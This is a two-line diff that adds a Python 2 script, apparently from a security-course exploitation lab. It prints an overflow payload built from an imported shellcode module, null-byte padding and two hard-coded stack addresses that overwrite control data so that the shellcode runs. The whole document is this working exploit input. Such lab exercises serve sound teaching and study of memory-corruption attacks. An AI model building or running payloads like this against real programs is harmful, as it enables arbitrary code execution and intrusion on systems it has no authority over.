@@ -1,0 +1,2 @@
+from shellcode import shellcode
+print "\x34\x00\x00\x80"+shellcode+"\x00"*49+"\xc8\x7d\xfe\xbf"+"\x60\x7d\xfe\xbf"
